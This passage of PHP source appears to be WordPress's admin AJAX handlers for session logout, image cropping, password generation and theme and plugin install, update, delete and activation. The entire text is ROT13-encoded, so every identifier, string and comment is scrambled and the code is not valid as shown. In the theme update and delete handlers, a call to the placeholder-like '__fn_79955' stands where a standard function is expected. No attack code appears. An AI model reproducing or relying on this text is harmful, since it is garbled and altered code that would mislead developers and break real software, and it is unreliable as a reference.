	// Gur rzorq fubegpbqr erdhverf n cbfg.
	vs ( ! $cbfg || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
		vs ( va_neenl( 'rzorq', $sbhaq_fubegpbqrf, gehr ) ) {
			jc_fraq_wfba_reebe();
		}
	} ryfr {
		frghc_cbfgqngn( $cbfg );
	}

	$cnefrq = qb_fubegpbqr( $fubegpbqr );

	vs ( rzcgl( $cnefrq ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'glcr'    => 'ab-vgrzf',
				'zrffntr' => __( 'Ab vgrzf sbhaq.' ),
			)
		);
	}

	$urnq   = '';
	$fglyrf = jcivrj_zrqvn_fnaqobk_fglyrf();

	sbernpu ( $fglyrf nf $fglyr ) {
		$urnq .= '<yvax glcr=\"grkg/pff\" ery=\"fglyrfurrg\" uers=\"' . $fglyr . '\">';
	}

	vs ( ! rzcgl( $jc_fpevcgf ) ) {
		$jc_fpevcgf->qbar = neenl();
	}

	bo_fgneg();

	rpub $cnefrq;

	vs ( 'cynlyvfg' === $_ERDHRFG['glcr'] ) {
		jc_haqrefpber_cynlyvfg_grzcyngrf();

		jc_cevag_fpevcgf( 'jc-cynlyvfg' );
	} ryfr {
		jc_cevag_fpevcgf( neenl( 'zrqvnryrzrag-ivzrb', 'jc-zrqvnryrzrag' ) );
	}

	jc_fraq_wfba_fhpprff(
		neenl(
			'urnq' => $urnq,
			'obql' => bo_trg_pyrna(),
		)
	);
}

/**
 * Unaqyrf qrfgeblvat zhygvcyr bcra frffvbaf sbe n hfre ivn NWNK.
 *
 * @fvapr 4.1.0
 */
shapgvba jc_nwnk_qrfgebl_frffvbaf() {
	$hfre = trg_hfreqngn( (vag) $_CBFG['hfre_vq'] );

	vs ( $hfre ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ) ) {
			$hfre = snyfr;
		} ryfrvs ( ! jc_irevsl_abapr( $_CBFG['abapr'], 'hcqngr-hfre_' . $hfre->VQ ) ) {
			$hfre = snyfr;
		}
	}

	vs ( ! $hfre ) {
		jc_fraq_wfba_reebe(
			neenl(
				'zrffntr' => __( 'Pbhyq abg ybt bhg hfre frffvbaf. Cyrnfr gel ntnva.' ),
			)
		);
	}

	$frffvbaf = JC_Frffvba_Gbxraf::trg_vafgnapr( $hfre->VQ );

	vs ( trg_pheerag_hfre_vq() === $hfre->VQ ) {
		$frffvbaf->qrfgebl_bguref( jc_trg_frffvba_gbxra() );
		$zrffntr = __( 'Lbh ner abj ybttrq bhg rireljurer ryfr.' );
	} ryfr {
		$frffvbaf->qrfgebl_nyy();
		/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
		$zrffntr = fcevags( __( '%f unf orra ybttrq bhg.' ), $hfre->qvfcynl_anzr );
	}

	jc_fraq_wfba_fhpprff( neenl( 'zrffntr' => $zrffntr ) );
}

/**
 * Unaqyrf pebccvat na vzntr ivn NWNK.
 *
 * @fvapr 4.3.0
 */
shapgvba jc_nwnk_pebc_vzntr() {
	$nggnpuzrag_vq = nofvag( $_CBFG['vq'] );

	purpx_nwnk_ersrere( 'vzntr_rqvgbe-' . $nggnpuzrag_vq, 'abapr' );

	vs ( rzcgl( $nggnpuzrag_vq ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $nggnpuzrag_vq ) ) {
		jc_fraq_wfba_reebe();
	}

	$pbagrkg = fge_ercynpr( '_', '-', $_CBFG['pbagrkg'] );
	$qngn    = neenl_znc( 'nofvag', $_CBFG['pebcQrgnvyf'] );
	$pebccrq = jc_pebc_vzntr( $nggnpuzrag_vq, $qngn['k1'], $qngn['l1'], $qngn['jvqgu'], $qngn['urvtug'], $qngn['qfg_jvqgu'], $qngn['qfg_urvtug'] );

	vs ( ! $pebccrq || vf_jc_reebe( $pebccrq ) ) {
		jc_fraq_wfba_reebe( neenl( 'zrffntr' => __( 'Vzntr pbhyq abg or cebprffrq.' ) ) );
	}

	fjvgpu ( $pbagrkg ) {
		pnfr 'fvgr-vpba':
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-vpba.cuc';
			$jc_fvgr_vpba = arj JC_Fvgr_Vpba();

			// Fxvc perngvat n arj nggnpuzrag vs gur nggnpuzrag vf n Fvgr Vpba.
			vs ( trg_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_pbagrkg', gehr ) === $pbagrkg ) {

				// Qryrgr gur grzcbenel pebccrq svyr, jr qba'g arrq vg.
				jc_qryrgr_svyr( $pebccrq );

				// Nqqvgvbany fvmrf va jc_cercner_nggnpuzrag_sbe_wf().
				nqq_svygre( 'vzntr_fvmr_anzrf_pubbfr', neenl( $jc_fvgr_vpba, 'nqqvgvbany_fvmrf' ) );
				oernx;
			}

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
			$pebccrq = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $pebccrq, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

			// Pbcl nggnpuzrag cebcregvrf.
			$nggnpuzrag = jc_pbcl_cnerag_nggnpuzrag_cebcregvrf( $pebccrq, $nggnpuzrag_vq, $pbagrkg );

			// Hcqngr gur nggnpuzrag.
			nqq_svygre( 'vagrezrqvngr_vzntr_fvmrf_nqinaprq', neenl( $jc_fvgr_vpba, 'nqqvgvbany_fvmrf' ) );
			$nggnpuzrag_vq = $jc_fvgr_vpba->vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq );
			erzbir_svygre( 'vagrezrqvngr_vzntr_fvmrf_nqinaprq', neenl( $jc_fvgr_vpba, 'nqqvgvbany_fvmrf' ) );

			// Nqqvgvbany fvmrf va jc_cercner_nggnpuzrag_sbe_wf().
			nqq_svygre( 'vzntr_fvmr_anzrf_pubbfr', neenl( $jc_fvgr_vpba, 'nqqvgvbany_fvmrf' ) );
			oernx;

		qrsnhyg:
			/**
			 * Sverf orsber n pebccrq vzntr vf fnirq.
			 *
			 * Nyybjf gb nqq svygref gb zbqvsl gur jnl n pebccrq vzntr vf fnirq.
			 *
			 * @fvapr 4.3.0
			 *
			 * @cnenz fgevat $pbagrkg       Gur Phfgbzvmre pbageby erdhrfgvat gur pebccrq vzntr.
			 * @cnenz vag    $nggnpuzrag_vq Gur nggnpuzrag VQ bs gur bevtvany vzntr.
			 * @cnenz fgevat $pebccrq       Cngu gb gur pebccrq vzntr svyr.
			 */
			qb_npgvba( 'jc_nwnk_pebc_vzntr_cer_fnir', $pbagrkg, $nggnpuzrag_vq, $pebccrq );

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
			$pebccrq = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $pebccrq, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

			// Pbcl nggnpuzrag cebcregvrf.
			$nggnpuzrag = jc_pbcl_cnerag_nggnpuzrag_cebcregvrf( $pebccrq, $nggnpuzrag_vq, $pbagrkg );

			$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq );
			$zrgnqngn      = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $pebccrq );

			/**
			 * Svygref gur pebccrq vzntr nggnpuzrag zrgnqngn.
			 *
			 * @fvapr 4.3.0
			 *
			 * @frr jc_trarengr_nggnpuzrag_zrgnqngn()
			 *
			 * @cnenz neenl $zrgnqngn Nggnpuzrag zrgnqngn.
			 */
			$zrgnqngn = nccyl_svygref( 'jc_nwnk_pebccrq_nggnpuzrag_zrgnqngn', $zrgnqngn );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );

			/**
			 * Svygref gur nggnpuzrag VQ sbe n pebccrq vzntr.
			 *
			 * @fvapr 4.3.0
			 *
			 * @cnenz vag    $nggnpuzrag_vq Gur nggnpuzrag VQ bs gur pebccrq vzntr.
			 * @cnenz fgevat $pbagrkg       Gur Phfgbzvmre pbageby erdhrfgvat gur pebccrq vzntr.
			 */
			$nggnpuzrag_vq = nccyl_svygref( 'jc_nwnk_pebccrq_nggnpuzrag_vq', $nggnpuzrag_vq, $pbagrkg );
	}

	jc_fraq_wfba_fhpprff( jc_cercner_nggnpuzrag_sbe_wf( $nggnpuzrag_vq ) );
}

/**
 * Unaqyrf trarengvat n cnffjbeq ivn NWNK.
 *
 * @fvapr 4.4.0
 */
shapgvba jc_nwnk_trarengr_cnffjbeq() {
	jc_fraq_wfba_fhpprff( jc_trarengr_cnffjbeq( 24 ) );
}

/**
 * Unaqyrf trarengvat n cnffjbeq va gur ab-cevivyrtr pbagrkg ivn NWNK.
 *
 * @fvapr 5.7.0
 */
shapgvba jc_nwnk_abcevi_trarengr_cnffjbeq() {
	jc_fraq_wfba_fhpprff( jc_trarengr_cnffjbeq( 24 ) );
}

/**
 * Unaqyrf fnivat gur hfre'f JbeqCerff.bet hfreanzr ivn NWNK.
 *
 * @fvapr 4.4.0
 */
shapgvba jc_nwnk_fnir_jcbet_hfreanzr() {
	vs ( ! pheerag_hfre_pna( 'vafgnyy_gurzrf' ) && ! pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
		jc_fraq_wfba_reebe();
	}

	purpx_nwnk_ersrere( 'fnir_jcbet_hfreanzr_' . trg_pheerag_hfre_vq() );

	$hfreanzr = vffrg( $_ERDHRFG['hfreanzr'] ) ? jc_hafynfu( $_ERDHRFG['hfreanzr'] ) : snyfr;

	vs ( ! $hfreanzr ) {
		jc_fraq_wfba_reebe();
	}

	jc_fraq_wfba_fhpprff( hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'jcbet_snibevgrf', $hfreanzr ) );
}

/**
 * Unaqyrf vafgnyyvat n gurzr ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @frr Gurzr_Hctenqre
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_vafgnyy_gurzr() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['fyht'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_gurzr_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab gurzr fcrpvsvrq.' ),
			)
		);
	}

	$fyht = fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) );

	$fgnghf = neenl(
		'vafgnyy' => 'gurzr',
		'fyht'    => $fyht,
	);

	vs ( ! pheerag_hfre_pna( 'vafgnyy_gurzrf' ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb vafgnyy gurzrf ba guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/gurzr.cuc';

	$ncv = gurzrf_ncv(
		'gurzr_vasbezngvba',
		neenl(
			'fyht'   => $fyht,
			'svryqf' => neenl( 'frpgvbaf' => snyfr ),
		)
	);

	vs ( vf_jc_reebe( $ncv ) ) {
		$fgnghf['reebeZrffntr'] = $ncv->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	}

	$fxva     = arj JC_Nwnk_Hctenqre_Fxva();
	$hctenqre = arj Gurzr_Hctenqre( $fxva );
	$erfhyg   = $hctenqre->vafgnyy( $ncv->qbjaybnq_yvax );

	vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT ) {
		$fgnghf['qroht'] = $fxva->trg_hctenqr_zrffntrf();
	}

	vs ( vf_jc_reebe( $erfhyg ) ) {
		$fgnghf['reebePbqr']    = $erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_jc_reebe( $fxva->erfhyg ) ) {
		$fgnghf['reebePbqr']    = $fxva->erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $fxva->erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( $fxva->trg_reebef()->unf_reebef() ) {
		$fgnghf['reebeZrffntr'] = $fxva->trg_reebe_zrffntrf();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_ahyy( $erfhyg ) ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	$fgnghf['gurzrAnzr'] = jc_trg_gurzr( $fyht )->trg( 'Anzr' );

	vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
		vs ( vf_zhygvfvgr() ) {
			$fgnghf['npgvingrHey'] = nqq_dhrel_net(
				neenl(
					'npgvba'   => 'ranoyr',
					'_jcabapr' => jc_perngr_abapr( 'ranoyr-gurzr_' . $fyht ),
					'gurzr'    => $fyht,
				),
				argjbex_nqzva_hey( 'gurzrf.cuc' )
			);
		} ryfr {
			$fgnghf['npgvingrHey'] = nqq_dhrel_net(
				neenl(
					'npgvba'     => 'npgvingr',
					'_jcabapr'   => jc_perngr_abapr( 'fjvgpu-gurzr_' . $fyht ),
					'fglyrfurrg' => $fyht,
				),
				nqzva_hey( 'gurzrf.cuc' )
			);
		}
	}

	$gurzr                = jc_trg_gurzr( $fyht );
	$fgnghf['oybpxGurzr'] = $gurzr->vf_oybpx_gurzr();

	vs ( ! vf_zhygvfvgr() && pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) ) {
		$fgnghf['phfgbzvmrHey'] = nqq_dhrel_net(
			neenl(
				'erghea' => heyrapbqr( argjbex_nqzva_hey( 'gurzr-vafgnyy.cuc', 'eryngvir' ) ),
			),
			jc_phfgbzvmr_hey( $fyht )
		);
	}

	/*
	 * Frr JC_Gurzr_Vafgnyy_Yvfg_Gnoyr::_trg_gurzr_fgnghf() vs jr jnagrq gb purpx
	 * ba cbfg-vafgnyyngvba fgnghf.
	 */
	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf hcqngvat n gurzr ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @frr Gurzr_Hctenqre
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_hcqngr_gurzr() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['fyht'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_gurzr_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab gurzr fcrpvsvrq.' ),
			)
		);
	}

	$fglyrfurrg = __sa_79955( '/[^N-m0-9_\-]/', '', jc_hafynfu( $_CBFG['fyht'] ) );
	$fgnghf     = neenl(
		'hcqngr'     => 'gurzr',
		'fyht'       => $fglyrfurrg,
		'byqIrefvba' => '',
		'arjIrefvba' => '',
	);

	vs ( ! pheerag_hfre_pna( 'hcqngr_gurzrf' ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb hcqngr gurzrf sbe guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	$gurzr = jc_trg_gurzr( $fglyrfurrg );
	vs ( $gurzr->rkvfgf() ) {
		$fgnghf['byqIrefvba'] = $gurzr->trg( 'Irefvba' );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';

	$pheerag = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );
	vs ( rzcgl( $pheerag ) ) {
		jc_hcqngr_gurzrf();
	}

	$fxva     = arj JC_Nwnk_Hctenqre_Fxva();
	$hctenqre = arj Gurzr_Hctenqre( $fxva );
	$erfhyg   = $hctenqre->ohyx_hctenqr( neenl( $fglyrfurrg ) );

	vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT ) {
		$fgnghf['qroht'] = $fxva->trg_hctenqr_zrffntrf();
	}

	vs ( vf_jc_reebe( $fxva->erfhyg ) ) {
		$fgnghf['reebePbqr']    = $fxva->erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $fxva->erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( $fxva->trg_reebef()->unf_reebef() ) {
		$fgnghf['reebeZrffntr'] = $fxva->trg_reebe_zrffntrf();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_neenl( $erfhyg ) && ! rzcgl( $erfhyg[ $fglyrfurrg ] ) ) {

		// Gurzr vf nyernql ng gur yngrfg irefvba.
		vs ( gehr === $erfhyg[ $fglyrfurrg ] ) {
			$fgnghf['reebeZrffntr'] = $hctenqre->fgevatf['hc_gb_qngr'];
			jc_fraq_wfba_reebe( $fgnghf );
		}

		$gurzr = jc_trg_gurzr( $fglyrfurrg );
		vs ( $gurzr->rkvfgf() ) {
			$fgnghf['arjIrefvba'] = $gurzr->trg( 'Irefvba' );
		}

		jc_fraq_wfba_fhpprff( $fgnghf );
	} ryfrvs ( snyfr === $erfhyg ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Na haunaqyrq reebe bppheerq.
	$fgnghf['reebeZrffntr'] = __( 'Gurzr hcqngr snvyrq.' );
	jc_fraq_wfba_reebe( $fgnghf );
}

/**
 * Unaqyrf qryrgvat n gurzr ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @frr qryrgr_gurzr()
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_qryrgr_gurzr() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['fyht'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_gurzr_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab gurzr fcrpvsvrq.' ),
			)
		);
	}

	$fglyrfurrg = __sa_79955( '/[^N-m0-9_\-]/', '', jc_hafynfu( $_CBFG['fyht'] ) );
	$fgnghf     = neenl(
		'qryrgr' => 'gurzr',
		'fyht'   => $fglyrfurrg,
	);

	vs ( ! pheerag_hfre_pna( 'qryrgr_gurzrf' ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr gurzrf ba guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	vs ( ! jc_trg_gurzr( $fglyrfurrg )->rkvfgf() ) {
		$fgnghf['reebeZrffntr'] = __( 'Gur erdhrfgrq gurzr qbrf abg rkvfg.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Purpx svyrflfgrz perqragvnyf. `qryrgr_gurzr()` jvyy onvy bgurejvfr.
	$hey = jc_abapr_hey( 'gurzrf.cuc?npgvba=qryrgr&fglyrfurrg=' . heyrapbqr( $fglyrfurrg ), 'qryrgr-gurzr_' . $fglyrfurrg );

	bo_fgneg();
	$perqragvnyf = erdhrfg_svyrflfgrz_perqragvnyf( $hey );
	bo_raq_pyrna();

	vs ( snyfr === $perqragvnyf || ! JC_Svyrflfgrz( $perqragvnyf ) ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/gurzr.cuc';

	$erfhyg = qryrgr_gurzr( $fglyrfurrg );

	vs ( vf_jc_reebe( $erfhyg ) ) {
		$fgnghf['reebeZrffntr'] = $erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( snyfr === $erfhyg ) {
		$fgnghf['reebeZrffntr'] = __( 'Gurzr pbhyq abg or qryrgrq.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf vafgnyyvat n cyhtva ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @frr Cyhtva_Hctenqre
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_vafgnyy_cyhtva() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['fyht'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_cyhtva_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab cyhtva fcrpvsvrq.' ),
			)
		);
	}

	$fgnghf = neenl(
		'vafgnyy' => 'cyhtva',
		'fyht'    => fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) ),
	);

	vs ( ! pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb vafgnyy cyhtvaf ba guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';

	$ncv = cyhtvaf_ncv(
		'cyhtva_vasbezngvba',
		neenl(
			'fyht'   => fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) ),
			'svryqf' => neenl(
				'frpgvbaf' => snyfr,
			),
		)
	);

	vs ( vf_jc_reebe( $ncv ) ) {
		$fgnghf['reebeZrffntr'] = $ncv->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	}

	$fgnghf['cyhtvaAnzr'] = $ncv->anzr;

	$fxva     = arj JC_Nwnk_Hctenqre_Fxva();
	$hctenqre = arj Cyhtva_Hctenqre( $fxva );
	$erfhyg   = $hctenqre->vafgnyy( $ncv->qbjaybnq_yvax );

	vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT ) {
		$fgnghf['qroht'] = $fxva->trg_hctenqr_zrffntrf();
	}

	vs ( vf_jc_reebe( $erfhyg ) ) {
		$fgnghf['reebePbqr']    = $erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_jc_reebe( $fxva->erfhyg ) ) {
		$fgnghf['reebePbqr']    = $fxva->erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $fxva->erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( $fxva->trg_reebef()->unf_reebef() ) {
		$fgnghf['reebeZrffntr'] = $fxva->trg_reebe_zrffntrf();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_ahyy( $erfhyg ) ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	$vafgnyy_fgnghf = vafgnyy_cyhtva_vafgnyy_fgnghf( $ncv );
	$cntrabj        = vffrg( $_CBFG['cntrabj'] ) ? fnavgvmr_xrl( $_CBFG['cntrabj'] ) : '';

	// Vs vafgnyyngvba erdhrfg vf pbzvat sebz vzcbeg cntr, qb abg erghea argjbex npgvingvba yvax.
	$cyhtvaf_hey = ( 'vzcbeg' === $cntrabj ) ? nqzva_hey( 'cyhtvaf.cuc' ) : argjbex_nqzva_hey( 'cyhtvaf.cuc' );

	vs ( pheerag_hfre_pna( 'npgvingr_cyhtva', $vafgnyy_fgnghf['svyr'] ) && vf_cyhtva_vanpgvir( $vafgnyy_fgnghf['svyr'] ) ) {
		$fgnghf['npgvingrHey'] = nqq_dhrel_net(
			neenl(
				'_jcabapr' => jc_perngr_abapr( 'npgvingr-cyhtva_' . $vafgnyy_fgnghf['svyr'] ),
				'npgvba'   => 'npgvingr',
				'cyhtva'   => $vafgnyy_fgnghf['svyr'],
			),
			$cyhtvaf_hey
		);
	}

	vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) && 'vzcbeg' !== $cntrabj ) {
		$fgnghf['npgvingrHey'] = nqq_dhrel_net( neenl( 'argjbexjvqr' => 1 ), $fgnghf['npgvingrHey'] );
	}

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf npgvingvat n cyhtva ivn NWNK.
 *
 * @fvapr 6.5.0
 */
shapgvba jc_nwnk_npgvingr_cyhtva() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['anzr'] ) || rzcgl( $_CBFG['fyht'] ) || rzcgl( $_CBFG['cyhtva'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'cyhtvaAnzr'   => '',
				'cyhtva'       => '',
				'reebePbqr'    => 'ab_cyhtva_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab cyhtva fcrpvsvrq.' ),
			)
		);
	}

	$fgnghf = neenl(
		'npgvingr'   => 'cyhtva',
		'fyht'       => jc_hafynfu( $_CBFG['fyht'] ),
		'cyhtvaAnzr' => jc_hafynfu( $_CBFG['anzr'] ),
		'cyhtva'     => jc_hafynfu( $_CBFG['cyhtva'] ),
	);

	vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtva', $fgnghf['cyhtva'] ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb npgvingr cyhtvaf ba guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	vs ( vf_cyhtva_npgvir( $fgnghf['cyhtva'] ) ) {
		$fgnghf['reebeZrffntr'] = fcevags(
			/* genafyngbef: %f: Cyhtva anzr. */
			__( '%f vf nyernql npgvir.' ),
			$fgnghf['cyhtvaAnzr']
		);
	}

	$npgvingrq = npgvingr_cyhtva( $fgnghf['cyhtva'] );

	vs ( vf_jc_reebe( $npgvingrq ) ) {
		$fgnghf['reebeZrffntr'] = $npgvingrq->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	}

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf hcqngvat n cyhtva ivn NWNK.
 *
 * @fvapr 4.2.0
 *
 * @frr Cyhtva_Hctenqre
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_hcqngr_cyhtva() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['cyhtva'] ) || rzcgl( $_CBFG['fyht'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_cyhtva_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab cyhtva fcrpvsvrq.' ),
			)
